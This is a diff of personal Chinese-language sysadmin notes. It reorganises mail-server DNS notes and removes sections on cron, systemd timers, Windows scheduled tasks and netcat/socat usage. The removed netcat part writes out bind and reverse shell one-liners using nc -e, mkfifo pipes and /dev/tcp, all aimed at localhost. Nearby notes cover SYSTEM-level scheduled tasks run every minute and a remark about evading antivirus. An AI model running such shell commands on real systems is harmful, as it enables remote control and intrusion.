@@ -1462,6 +1462,29 @@ vscode的使用技巧
     能收发外网的邮件
         除了 搭建 smtp 和 imap 之外，还要做好域名的解释
         域名解释才是最困难的部分
+            域名解释
+                A 记录
+                    @ 指向 ip
+                CNAME 记录
+                    mail 指向 A 记录
+                MX 记录
+                    @ 指向 CNAME 记录
+                TXT 记录
+                    spf dkim dmarc
+                PTR 记录
+                    域名 指向 ip
+            各种代理
+                mua webmail RainLoop
+                mta exim Postfix sendmail
+                    amavisd-new 调度 ClamAV 和 SpamAssassin
+                    ClamAV 邮件反病毒
+                    SpamAssassin 过滤垃圾邮件
+                mda Dovecot
+                msa
+                mra
+                maa
+            opendkim
+            还有更多？ bimi RUA RUF MTA-STS TLS-RPT
         要确保这几个端口的开放
             25 465 143 993
             除了安全组，防火墙，还要向运营商确认这几个端口有没有开放
@@ -1962,29 +1985,6 @@ git的一般使用指南
                 crm
         邮箱
             自建邮箱服务
-                域名解释
-                    A 记录
-                        @ 指向 ip
-                    CNAME 记录
-                        mail 指向 A 记录
-                    MX 记录
-                        @ 指向 CNAME 记录
-                    TXT 记录
-                        spf dkim dmarc
-                    PTR 记录
-                        域名 指向 ip
-                各种代理
-                    mua webmail RainLoop
-                    mta exim Postfix sendmail
-                        amavisd-new 调度 ClamAV 和 SpamAssassin
-                        ClamAV 邮件反病毒
-                        SpamAssassin 过滤垃圾邮件
-                    mda Dovecot
-                    msa
-                    mra
-                    maa
-                opendkim
-                还有更多？ bimi RUA RUF MTA-STS TLS-RPT
             企业邮箱
             通讯录
                 CardDAV
@@ -3576,229 +3576,6 @@ ELF格式
     查看文件格式 `file 文件路径`
     查看 elf 文件类型 `readelf -h 文件路径`
     32位和64位的格式会有一些差异
-定时任务
-    cron
-        安装
-            centos
-                yum install vixie-cron crontabs
-            debian
-                apt-get install cron
-            大多数发行版都会自带 cron
-        cron 通常分为三部分
-            crond 是 cron 在系统内的守护进程，
-            crontab 是管理 cron 任务的工具
-            配置文件
-                配置文件的位置？
-        cron 表达式
-            * * * * *
-            分 时 日 月 星期
-            特别的
-                @yearly 0 0 1 1 * 每年运行一次
-                @monthly 0 0 1 * * 每月运行一次
-                @weekly 0 0 * * 0 每星期运行一次
-                @daily 0 0 * * * 每日运行一次
-                @hourly 0 * * * * 每小时运行一次
-                        * * * * * 每分钟运行一次 这个就没有特殊的名称了
-                @reboot
-                    将作业配置为在守护程序启动时运行一次。
-                    由于 cron 通常永远不会重新启动，因此这通常用于系统启动时运行的任务
-        常用的命令
-            crontab -l
-            crontab -e
-                和直接修改配置文件相比
-                crontab -e 在退出时会检测一次语法
-        cron 的实现
-            vixie cron
-                这个应该是现在最流行的 cron 版本了
-                https://github.com/vixie/cron
-            busybox 版的 cron
-                https://github.com/mirror/busybox/blob/HEAD/miscutils/crond.c
-                https://github.com/mirror/busybox/blob/HEAD/miscutils/crontab.c
-            其他流行的实现包括 anacron dcron mcron cronie
-            cron 的实现要比想象中的简单不少
-            对于大多数发行版的 cron 而言
-                cron 是无状态的，
-                cron 在代码里写死了60秒扫描一次配置文件，
-                    为什么cron没有秒级的任务？
-                        因为代码里写死了60秒扫描一次配置文件
-                    为什么是60秒？
-                        大概可能因为是 祖宗之法不可变 吧
-                扫描配置文件时，遇到符合规则的任务就会运行，
-                对于单个任务的状态， cron 是不会判断的，不判断上次任务的成功或失败，不判断上次任务运行的时间
-        使用bash脚本实现的隔秒运行和单例运行
-            隔秒运行
-                * * * * * cron.sh
-                #!/bin/bash
-                step=1 #间隔的秒数，不能大于60
-                for (( i = 0; i < 60; i=(i+step) )); do
-                    $(php test.php)
-                    sleep $step
-                done
-                exit 0
-            单例运行
-                要使用文件锁确保当前只有一个脚本在运行
-                flock命令
-                    例子1
-                    ```
-                    #!/usr/bin/env bash
-                    LOCK_FILE=/var/lock/test.lock
-                    exec 99>"$LOCK_FILE"
-                    flock -n 99
-                    if [ "$?" != 0 ]; then
-                        echo "$0 already running"
-                        exit 1
-                    fi
-                    #脚本要做的其他事情
-                    ```
-                    例子2
-                    ```
-                    #!/usr/bin/env bash
-                    [ "${FLOCKER}" != "$0" ] && exec env FLOCKER="$0" flock -en  "$0"  "$0"  "$@" || :
-                    # 如果${FLOCKER}环境变量没有设置，则尝试将脚本本身加锁，如果加锁成功，则运行当前脚本，（并且带上原有的参数），否则的话静默退出。
-                    #脚本要做的其他事情
-                    ```
-        其实现在的 cron 也是通过 systemd 运行的
-            crond.service
-            systemctl status crond.service
-    systemd 的 timer
-        创建一个 service
-            /usr/lib/systemd/system/MyTimer.service
-                [Unit]
-                Description=MyTimer
-
-                [Service]
-                ExecStart=/bin/bash /path/to/MyTimer.sh
-            可以像这样运行一次测试是否有生效
-                systemctl start MyTimer.service
-        然后创建一个 timer
-            /usr/lib/systemd/system/MyTimer.timer
-                [Unit]
-                Description=Runs mytimer every hour
-
-                [Timer]
-                # 定时器
-                OnUnitActiveSec=1h
-                # 定时器触发的任务
-                Unit=mytimer.service
-
-                [Install]
-                # 开机启动时的依赖项，大多数情况下都是填这个
-                WantedBy=multi-user.target
-            定时器的写法可以参考文档
-                https://www.freedesktop.org/software/systemd/man/systemd.time.html
-        最后把 timer 加入到开机启动中
-            systemctl enable MyTimer.timer
-        定时器的相关命令
-            列出所有定时器
-                systemctl list-timers
-            systemctl 的命令也能直接用在 定时器中
-                start stop status enable disable
-            查看所有单元
-                systemctl list-unit-files
-            查看所有 Service 单元
-                systemctl list-unit-files --type service
-            查看所有 Timer 单元
-                systemctl list-unit-files --type timer
-        systemed 的 timer 可以实现 秒级 任务，但 crond 不可以
-        systemed 的 timer 比 crond 的灵活很多，基本接近 windows 的计划任务了
-    在 linux 下的一次性任务用 at 和 atq 命令
-    windows 的 计划任务 包括了 开机启动 和 定时任务
-        以前用 at 命令操作
-        现在用 schtasks 命令操作
-        当然啦，用图形界面也是可以的
-            taskschd.msc
-            https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks
-            https://learn.microsoft.com/zh-cn/windows/win32/taskschd/task-scheduler-start-page
-            https://learn.microsoft.com/zh-cn/windows/win32/taskschd/using-the-task-scheduler
-        schtasks
-            查询任务
-                schtasks /Query
-                schtasks /Query /TN "\Microsoft\Windows\WwanSvc\NotificationTask"
-                schtasks /Query /V /TN "\Microsoft\Windows\WwanSvc\NotificationTask"
-            删除任务
-                schtasks /Delete /TN taskname /F
-                taskname 是任务名
-                /F 是强制执行
-            创建任务
-                schtasks /Create /TN taskname /TR taskrun
-                定时任务的表达式有一点混乱，最好还是去看文档
-                    每分钟运行一次
-                        schtasks /create /sc minute /mo 1 /tn "task name" /tr "command"
-                    开机启动，设置开机启动的任务需要管理员权限
-                        schtasks /create /sc ONSTART /tn "task name onstart" /tr "command"
-        用 powershell 的 cmdlets 也能创建 windows 的定时任务
-            https://learn.microsoft.com/en-us/powershell/module/scheduledtasks
-            https://learn.microsoft.com/zh-cn/powershell/module/microsoft.powershell.utility/new-timespan
-        使用 powershell 创建定时任务
-            这是分开创建的，分开创建可以使用多个触发器
-                $Act1 = New-ScheduledTaskAction -Execute "command";
-                $Time = New-ScheduledTaskTrigger -Once -At (Get-Date)  -RepetitionInterval (New-TimeSpan -Minutes 1) ;
-                Register-ScheduledTask -TaskName "SoftwareScan" -Trigger $Time -Action $Act1;
-            这是合成一条命令
-                每分钟运行一次
-                Register-ScheduledTask -TaskName "SoftwareScan" -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date)  -RepetitionInterval (New-TimeSpan -Minutes 1)) -Action (New-ScheduledTaskAction -Execute "command");
-                开机启动
-                Register-ScheduledTask -TaskName "SoftwareScan" -Trigger (New-ScheduledTaskTrigger -AtStartup) -Action (New-ScheduledTaskAction -Execute "command");
-            使用多个触发器的例子
-                每天11:00和23:00运行一次
-                $Act1 = New-ScheduledTaskAction -Execute "command";
-                $Time1 = New-ScheduledTaskTrigger -Daily -At 11am;
-                $Time2 = New-ScheduledTaskTrigger -Daily -At 11pm;
-                Register-ScheduledTask -TaskName "SoftwareScan2" -Trigger ($Time1, $Time2) -Action $Act1;
-        计划任务一个触发器只能设定一个时间，但一个任务可以有多个触发器，schtasks命令只能设置一个触发器
-        如果计划任务运行的是 bat 或 ps 或 bash 脚本，任务运行时会弹出一个黑框
-            如果要隐藏黑框，需要以管理员权限生成任务，或者用 vbs 的方式调用脚本，但vbs的方式很容易被杀毒软件拦截
-                schtasks /create /sc minute /mo 1 /ru System /tn "acme_cron" /tr "command"
-                Register-ScheduledTask -User System -TaskName "SoftwareScan" -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date)  -RepetitionInterval (New-TimeSpan -Minutes 1)) -Action (New-ScheduledTaskAction -Execute "command");
-        通过 xml 文件你创建计划任务
-             Register-ScheduledTask -Xml test.xml -TaskName "task name"
-             schtasks /create /xml test.xml /tn "task name"
-            xml 的具体语法
-                https://learn.microsoft.com/zh-cn/windows/win32/taskschd/task-scheduler-schema
-            通过 xml 创建的计划任务能实现多个触发器，和 gui 的功能基本一致了
-    在 windows 下如何运行 cron ？
-        关键是要能每分钟扫描一次 cron 的配置文件，然后执行符合规则的任务
-            有一个能每分钟运行一次或持续运行的程序用来扫描 cron 的配置文件
-                直接运行一个命令行，然后不关闭窗口
-                让程序以服务的形式运行
-                    可以直接在代码里写好
-                    也可以用 nssm 或 winsw 这类工具把普通的程序封装成服务
-                使用 计划任务 ，每分钟运行一次
-            能解释 cron 表达式
-                这种库在 github 十分的多，而且各种语言实现的都有，但怎样实现 @reboot ?
-                        https://github.com/dragonmantank/cron-expression tag
-                        https://github.com/peppeocchi/php-cron-scheduler
-                    如果是 一直运行的命令行 或 服务 的形式
-                        就一开始启动时运行一次，以后就忽略
-                    如果是 计划任务 ，每分钟运行一次
-                        通过 系统启动时间 或 系统运行时长 来判断是否需要运行 @reboot
-                            wmic path Win32_OperatingSystem get LastBootUpTime
-                            (get-date) - (gcim Win32_OperatingSystem).LastBootUpTime
-                            (Get-Date (Get-CimInstance -ClassName win32_operatingsystem).LastBootUpTime -UFormat %s).ToString() // 开机时间的10位时间戳
-                            锁定 注销 睡眠 休眠 都 不会计入停机时间
-    mysql 的 事件调度器(Event Scheduler) 和 PostgreSQL 的 PgAgent 也能实现定时任务
-    除了 crod 和 window 的计划任务之外，还有哪些好用的定时任务或计划任务工具？
-    计划任务 schedule job
-        触发器
-            基于时间的
-            基于事件的
-                系统状态
-                    开机/关机
-                    用户登入/用户登出
-                自定义事件
-                    web hook 这类的
-        任务
-        任务监控
-            记录任务的状态
-                是否有出错，出错是否有错误的记录？
-                运行开始时间
-                运行时长
-                运行结束时间
-            失败后重试？
-            任务超时后强制关闭？
-            任务的miss？
-            失败后的日志和通知？
-        分布式的任务？distributed schedule job
 MySQL 和 PostgreSQL
     比较 MySQL 和 PostgreSQL
         pg 和 mysql 在语法有一些差异
@@ -3844,6 +3621,7 @@ MySQL 和 PostgreSQL
             时序数据库
             图数据库
             空间数据(gis)
+    其实 mssql 也有全家桶，类似地 Oracle 和 db2 应该也有全家桶吧？
 openbsd-inetd
     ```
     # 拉取镜像
@@ -3894,170 +3672,6 @@ openbsd-inetd
     inetd（internet daemon）
     感觉 inetd 就像是守护进程版的 nc
     和 nc 一样只处理连接，然后把socket的输入和输出重定向到标准输入和标准输出
-nc netcat ncat socat
-    nc 和 netcat 都是一样的
-        nc 有两种实现
-            GNU 版本，一般系统自带
-            openbsd 版本
-        GNU 版本的包名通常为 nc-traditional netcat-traditional
-            https://snapshot.debian.org/package/netcat/
-        openbsd 版本的包名通常为 nc-openbsd netcat-openbsd
-            https://github.com/openbsd/src/blob/master/usr.bin/nc
-        判断当前系统的 nc 版本
-            先用 type nc
-            再用 realpath 或 ls -l 查看 nc 的真实路径，最好用 realpath
-            类似这样 realpath /bin/nc
-    ncat 是 nmap 项目的组成部分。
-        https://nmap.org/ncat/
-        Nmap (“Network Mapper(网络映射器)”) 
-        Nmap（“网络映射器”）是一个免费的开源实用程序，用于 网络发现和安全审核。
-        除了经典的命令行 Nmap 可执行文件之外，Nmap 套件包括
-        高级 GUI 和结果查看器 （Zenmap），一个灵活的数据 传输、重定向和调试工具 （Ncat），一个实用程序 比较扫描结果 （Ndiff） 和数据包生成和响应分析工具 （Nping）
-        ncat 支持 tls
-        ncat 的包名通常是 ncat nmap-ncat
-        https://github.com/nmap/nmap/tree/master/ncat
-    socat 是一个 nc 的替代品，可以称为 nc++。是 netcat 的 N 倍 加强版。
-        socat 的官方文档描述它是 "netcat++" (extended design, new implementation)
-        socat 的包名就是 socat
-        socat 是 socket cat 的缩写
-        http://www.dest-unreach.org/socat/
-    BusyBox 里也有一个轻量版的 nc ，同样地 toybox 里也有一个 nc
-        https://github.com/mirror/busybox/blob/master/networking/nc.c
-    除此之外，还有一个 cryptcat
-        cryptcat 是 netcat 的变体，基本上就是多了一个 密码 的参数
-        cryptcat 好像是来自 kali linux
-    从功能上看
-        BusyBox nc < nc-traditional < nc-openbsd < ncat < socat
-    nc 的原理是什么？
-        只处理连接
-        socket一部分参数可以通过命令行传入，例如 -w -u 这类
-        把socket的输入和输出重定向到标准输入和标准输出
-    有哪些通用的语法？
-        似乎除了 -l 之外，其它参数都有变动
-        最稳妥的方式还是通过 -h 来查看帮助
-    这里有描述如何用 ncat 实现最简单的五个协议
-        https://nmap.org/ncat/guide/ncat-simple-services.html
-    echo
-        while read -r line; do echo "$line"; done
-        echo 123 | while read -r line; do echo "$line"; done
-        echo -e "123\n321" | while read -r line; do echo "$line"; done
-        nc -l -k -p 9901 -e "cat $@"
-    daytime
-        date -u "+%d %b %y %k:%M:%S %z"
-        date -u --rfc-2822
-        date -u --rfc-3339="seconds"
-        date -u --iso-8601="seconds"
-    time
-        date +%s | awk '{printf "%#x", $1+2209017600}' | xxd -r
-    discard
-        while read -r line; do echo "$line" > /dev/null; done
-    chargen
-        lineLimit=72;offset=0;count=0;while true; do for ((i=0; i<$lineLimit; i++)); do tag=$((($i + $offset) % 95)); printf "\x$(printf %x $(($tag + 32)))"; done; offset=$(($offset + 1)); if [ $offset -ge 95 ]; then offset=0; fi; printf "\n";count=$(($count + 1)); done;
-    nc 扫描端口
-        nc -v -i 1 127.0.0.1 801
-        nc -v -z -i 1 127.0.0.1 801
-        nc -v -z -i 1 127.0.0.1 800-900
-        不是所有版本的nc都支持 z 参数，不是所有版本的 nc 支持批量端口扫描
-    nc 实现聊天
-        最简单的一对一
-            nc -l 801
-            nc 127.0.0.1 801
-    nc 传输文件
-        接收端先运行一个 nc
-            nc -l 801 > output.txt
-        发送端再运行一个 nc
-            nc 127.0.0.1 801 < input.txt
-    nc 实现一个转发服务
-        nc 自己调用自己
-        nc -v -l -k -p 9901 -e "nc 127.0.0.1 9902"
-        nc -v -l -k -p 9901 -e "bash -c \"nc 127.0.0.1 9902\""
-        mkfifo pipe1;cat pipe1 | nc -v -l -p 9901 | /bin/bash -c "nc 127.0.0.1 9902" 2>&1 1>pipe1;
-    nc 实现远程 shell
-        远程 shell
-            nc -v -l -p 9901 -e "bash"
-        控制端
-            nc -v 127.0.0.1 9901
-        即使没有 -e 参数，也能通过管道实现各种奇技淫巧，虽然管道的奇技淫巧只能处理单个连接
-            mkfifo pipe1;cat pipe1 | nc -v -l -p 9901 | /bin/bash 2>&1 1>pipe1;
-    nc 实现远程反向 shell
-        控制端先运行一个 nc
-            nc -v -l -p 9901
-        目标机器上连接控制机器的 9901 端口，并将其shell绑定到该连接上
-            nc -v 127.0.0.1 9901 -e "bash"
-            mkfifo pipe1; cat pipe1 | nc -v 127.0.0.1 9901 | /bin/bash 2>&1 1>pipe1;
-            exec 3<>/dev/tcp/127.0.0.1/9901; exec 0>&3; exec 1<&3; /bin/bash 2>&1;
-            exec 3<>/dev/tcp/127.0.0.1/9901; /bin/bash 2>&1 0>&3 1<&3; 这种写法似乎更好
-    nc 如何模拟 telnet 客户端？
-    nc 也可以像 telnet 那样模拟 http 客户端
-        nc www.baidu.com 80
-        连接后，快速地输入 GET / HTTP/1.0 然后连续输入两个回车，就能返回网页内容
-        又或者直接一句命令
-            printf 'GET / HTTP/1.0\r\nHost:www.baidu.com\r\n\r\n' | nc www.baidu.com 80
-    nc 如何模拟 http 服务器？静态的，动态的
-        nc -v -l -k -p 9901 -c "echo \"HTTP/1.0 200 OK\\r\\nContent-Length: 11\\r\\n\\r\\nhelloworld\"";
-        这一句是可行的，无法保持运行
-        while true; do nc -v -l -k -p 9901 -c "echo \"HTTP/1.0 200 OK\\r\\nContent-Length: 11\\r\\n\\r\\nhelloworld\""; done;
-        这一句是可行的，能保持运行，但每次只能处理一个请求，但无法退出
-        trap "{ kill $$; }" SIGINT;while true; do nc -v -l -k -p 9901 -c "echo \"HTTP/1.0 200 OK\\r\\nContent-Length: 11\\r\\n\\r\\nhelloworld\""; sleep 1s; done;
-        这一句是可行的，能保持运行，但每次只能处理一个请求，通过连续两次 ctrl+c 退出，但个请求都要等待一秒
-        trap "{ kill $$; }" SIGINT;while true; do nc -v -l -k -p 9901 -c "echo \"HTTP/1.0 200 OK\\r\\nContent-Length: 11\\r\\n\\r\\nhelloworld\""; sleep 0.5s; done;
-        这一句是可行的，能保持运行，但每次只能处理一个请求，通过连续两次 ctrl+c 退出，但个请求都要等待零点五秒，如果等待时间太短就无法通过连续两次 ctrl+c 退出了
-        while true; do nc -v -l -k -p 9901 -c "echo \"HTTP/1.0 200 OK\\r\\nContent-Length: 11\\r\\n\\r\\nhelloworld\""; sleep 0.5s; done;
-        这一句是可行的
-        while true; do { echo -e 'HTTP/1.1 200 OK\r\nContent-Length: 11\r\n\r\n'; echo helloworld; } | nc -v -l -k -p 9901; sleep 0.5s; done
-        这一句是可行的
-        trap "{ kill $$; }" SIGINT;while true; do nc -v -l -k -p 9901 -e ./http.sh; sleep 0.5s; done;
-        这是运行脚本文件的例子
-        这是脚本文件的内容
-            #!/bin/bash
-            echo -n "HTTP/1.0 200 OK"
-            echo -e -n "\r\n"
-            echo -n "Content-Length: 11"
-            echo -e -n "\r\n\r\n"
-            echo "helloworld"
-        测试用的命令
-            curl -v 127.0.0.1:9901
-            nc 127.0.0.1 9901
-        已经有人做了类似的了
-            https://github.com/avleen/bashttpd
-            netcat -lp 9901 -e ./bashttpd
-            我试过了，这个是可行的
-    socat 和 ncat 和 nc-openbsd 都支持 tsl ，又可以搞各种奇技淫巧了。。。
-    用 python 和 php 实现一个 nc ，只实现 -v -h -l 这三个参数即可
-        如果 bash 有 /usr/lib/bash/accept 这个特性，那么直接用 bash 实现一个 nc 也不是不可以的
-    windows 如何使用 nc
-        github 上有好几个 windows 版的 nc ，但都很久没更新了
-            https://github.com/diegocr/netcat
-            https://github.com/int0x33/nc.exe
-        先下载 windows 版的 busybox ，再使用 busybox 里的 nc
-            https://frippery.org/busybox/
-            https://github.com/rmyorston/busybox-w32
-            要下载 busybox64u.exe 这个版本，64位且支持 unicode ，虽然这个版本只支持 win10和win11
-        nmap 也有提供 windows 版的 nc
-            https://nmap.org/ncat/
-            https://sectools.org/tool/netcat/
-            https://nmap.org/book/ncat-man.html
-            https://nmap.org/ncat/guide/index.html
-        windows 版的 ncat 最好还是在 bash 里运行。。。
-        或者用 脚本 语言自己实现一个也可以。。。
-    nc 的源码
-        Nmap的nc
-            https://github.com/nmap/nmap/tree/master/ncat
-            https://github.com/nmap/nmap/blob/master/ncat/ncat_main.c
-        BusyBox nc
-            https://github.com/mirror/busybox/blob/master/networking/nc.c
-        nc-openbsd
-            https://github.com/openbsd/src/blob/master/usr.bin/nc/netcat.c
-        nc-traditional
-            可以下载到源码，但不能在线预览，bz2 的那个才是源码
-            https://snapshot.debian.org/package/netcat/
-            https://manpages.debian.org/bookworm/netcat-traditional/nc.traditional.1.en.html
-        socat 的源码镜像，但很久没更新了
-            https://github.com/3ndG4me/socat
-            源码可以直接在官网里下载 gz 文件
-            http://www.dest-unreach.org/socat/
-        原始版本的nc，也是很久都没更新了
-            https://sourceforge.net/p/nc110/git/ci/master/tree/
 bash 如何实现并发
     使用 &
     使用 &+wait
